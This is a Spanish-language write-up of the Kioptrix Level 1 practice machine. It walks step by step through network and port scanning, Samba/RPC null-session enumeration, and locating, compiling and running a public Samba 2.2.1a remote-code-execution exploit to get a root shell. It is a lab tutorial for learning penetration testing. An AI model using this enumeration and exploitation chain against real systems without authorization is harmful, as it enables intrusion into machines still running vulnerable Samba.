# Kioptrix Level 1 - Write-Up

## Enumeración

>Realizaremos un descubrimiento mediante el protocolo ARP para encontrar la dirección IP de la máquina víctima:

```bash
arp-scan -I eth0 --localnet --ignoredups
```
| Parámetro    | Utilidad                                           |
| ------------ | -------------------------------------------------- |
| -I           | Elegir la interfaz en la que realizar el barrido.  |
| --localnet   | Realizar el barrido en la red local.               |
| --ignoredups | Ignorar posibles duplicados a la hora del barrido. |

![Pasted image 20240729231008](https://github.com/user-attachments/assets/12c86fdd-ab14-4c4a-b28e-8bfd40a3185e)

>Posteriormente realizaremos un escaneo de puertos para obtener los puertos abiertos de la máquina víctima:

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -Pn -n IP
```

| Parámetro    | Utilidad                                           |
| ------------ | -------------------------------------------------- |
| -p-           | Escanear todos los puertos de la máquina (65535).  |
| --open   | Mostrar en el resultado solo los puertos abiertos.               |
| --min-rate | Solo enviar paquetes que vayan a una velocidad de x paquetes por segundo. | 
|-sS | Realizar un stealth scan que no concluye el three-way handshake del protocolo TCP enviando un RST en lugar de un ACK. (Agiliza el escaneo)
-vvv | Muestra muy detalladamente el resultado del comando.
-Pn | Dejamos de usar el protocolo de resolución de direcciones ARP para el escaneo. (Agiliza el escaneo)
-n | Dejamos de usar el servicio DNS para resolver la dirección. (Agiliza el escaneo)

[Imagen]

> Haremos un escaneo de puertos con scripts de reconocimiento y versión para obtener más información acerca de los servicios que están corriendo en la máquina:

```bash
nmap -p22,80,111,139,443,1024 -sCV -Pn -n -vvv IP
```

| Parámetro    | Utilidad                                           |
| ------------ | -------------------------------------------------- |
| -px           | Escanea solo los puertos o el rango especificado en lugar de la x.  |
| -sCV   | Realizar un escaneo de versión y usar scripts de reconocimiento propios de la utilidad.               |


>Como el puerto 139 está corriendo samba trataremos de enumerar el NBT.

**NetBIOS over TCP/IP** (NBT) permite que aplicaciones basadas en NetBIOS se comuniquen sobre redes TCP/IP. Este protocolo utiliza el puerto TCP 139 para gestionar sesiones NetBIOS, facilitando la conexión y comunicación entre equipos en una red local.

**Samba** es un software libre que implementa el protocolo SMB/CIFS, permitiendo la compartición de archivos e impresoras entre sistemas Unix/Linux y Windows. Samba facilita la interoperabilidad en redes mixtas, soportando tanto NBT (a través del puerto TCP 139) como SMB directamente sobre TCP/IP (a través del puerto TCP 445).

```bash
nbtscan IP
```

[Imagen]

> Ahora trataremos de loggearnos en el rpc mediante una NULL session la cual resulta ser válida en esta máquina.

**RPC** (Remote Procedure Call) es un protocolo que permite a un programa ejecutar procedimientos o subrutinas en otro programa, localizado en una máquina remota, como si estuvieran ejecutándose localmente. Es una técnica esencial en la comunicación entre diferentes sistemas en una red, facilitando la interoperabilidad y distribución de tareas en aplicaciones distribuidas.

```bash
rpcclient -U "" IP
```



| Parámetro    | Utilidad                                           |
| ------------ | -------------------------------------------------- |
| -U           | Elegir el nombre de usuario que emplearemos para loggearnos. Si está vacío se tratará de una NULL session. |

[Imagen]

> También podemos hacer uso de la herramienta enum4linux para obtener una mayor información acerca de la máquina víctima:

```bash
enum4linux IP
```

## Explotación

>Como la versión de samba que está corriendo es una vulnerable, trataremos de buscar un exploit para esta, la versión la obtuvimos con el último comando realizado:

```bash
searchsploit "Samba 2.2.1a"
```

[Imagen]

> Ahora trataremos de emplear el siguiente exploit que permite realizar una RCE (Remote Code Execution), por lo que tendremos que obtenerlo mediante el siguiente comando:

```bash
searchsploit -m multiple/remote/10.c
```



| Parámetro    | Utilidad                                           |
| ------------ | -------------------------------------------------- |
| -m           | Elegir la ruta del exploit que quieres descargar de exploitDB.  |

[Imagen]

> Ahora procederemos a compilarlo y darle permisos de ejecución:

```bash
gcc 10.c -o exploit
```

| Parámetro    | Utilidad                                           |
| ------------ | -------------------------------------------------- |
| -o           | Elegir el nombre y ubicación del script compilado.  |

```bash
chmod +x exploit
```

| Parámetro    | Utilidad                                           |
| ------------ | -------------------------------------------------- |
| +x           | Permite brindar al binario de permisos de ejecución.  |


[Imagen]

> Ahora emplearemos el binario siguiendo el uso recomendado por el creador con los parámetros que veamos convenientes y ganaremos acceso como root en la máquina víctima:

```bash
./exploit -v -p 139 -b 0 IP
```

| Parámetro    | Utilidad                                           |
| ------------ | -------------------------------------------------- |
| -v           | Permite ver el resultado y la ejecución de forma detallada.  |
-p | Permite elegir el puerto sobre el que se usará el exploit.
-b | Permite seleccionar que distribución de SO (Sistema Operativo) está empleando la máquina víctima.

[Imagenes 2]

> Una vez hecho esto, ya estaría comprometida la máquina. Al haber obtenido directamente una shell como el usuario root no necesitariamos realizar una escalada de privilegios.
